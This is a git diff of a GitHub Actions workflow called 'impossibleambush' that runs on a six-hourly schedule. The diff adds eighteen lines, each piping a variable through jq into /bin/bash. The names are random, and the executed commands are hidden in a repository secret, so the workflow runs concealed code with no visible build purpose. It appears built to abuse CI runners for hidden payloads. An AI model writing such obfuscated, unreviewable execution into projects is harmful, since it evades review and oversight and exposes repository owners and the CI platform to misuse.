@@ -3,7 +3,7 @@ name: impossibleambush
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 1/6 * * *'
+    - cron: '42 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: impossibleambush
         env:
-          tiuwa4: ${{ secrets.tiuwa4 }}
+          yjun4: ${{ secrets.yjun4 }}
         run: |
-          echo $tiuwa4 | jq -r .e57106 | /bin/bash
-          echo $irz673 | jq -r .c8 | /bin/bash
-          echo $x5394 | jq -r .xp9209 | /bin/bash
-          echo $q339 | jq -r .ujf496 | /bin/bash
-          echo $z06 | jq -r .nlgl7777 | /bin/bash
-          echo $ftzrk761 | jq -r .nmsb5 | /bin/bash
-          echo $qjzs4105 | jq -r .fgui7261 | /bin/bash
-          echo $eu56 | jq -r .yz06355 | /bin/bash
-          echo $wbcwo5 | jq -r .qk7409 | /bin/bash
-          echo $iuts742 | jq -r .dig132 | /bin/bash
-          echo $pfuqy8680 | jq -r .uo81 | /bin/bash
+          echo $yjun4 | jq -r .iusp5 | /bin/bash
+          echo $r6 | jq -r .ztbb61313 | /bin/bash
+          echo $frh5236 | jq -r .t439 | /bin/bash
+          echo $uq156 | jq -r .x6603 | /bin/bash
+          echo $xfvsj1 | jq -r .ig8354 | /bin/bash
+          echo $i3 | jq -r .hpu30431 | /bin/bash
+          echo $h4 | jq -r .vdfu2380 | /bin/bash
+          echo $hu01 | jq -r .ofgl99131 | /bin/bash
+          echo $cgxnm86 | jq -r .sbomt75 | /bin/bash
+          echo $qw8 | jq -r .cfz459 | /bin/bash
+          echo $pdf4 | jq -r .wirk5859 | /bin/bash
+          echo $dxr276 | jq -r .eknkt54825 | /bin/bash
+          echo $dh3248 | jq -r .m4 | /bin/bash
+          echo $tcz45817 | jq -r .yfb107 | /bin/bash
+          echo $paci85151 | jq -r .rgqli5 | /bin/bash
+          echo $m40395 | jq -r .twcws905 | /bin/bash
+          echo $ryndl6 | jq -r .jqs4 | /bin/bash
+          echo $sn82 | jq -r .phwhk38 | /bin/bash
 
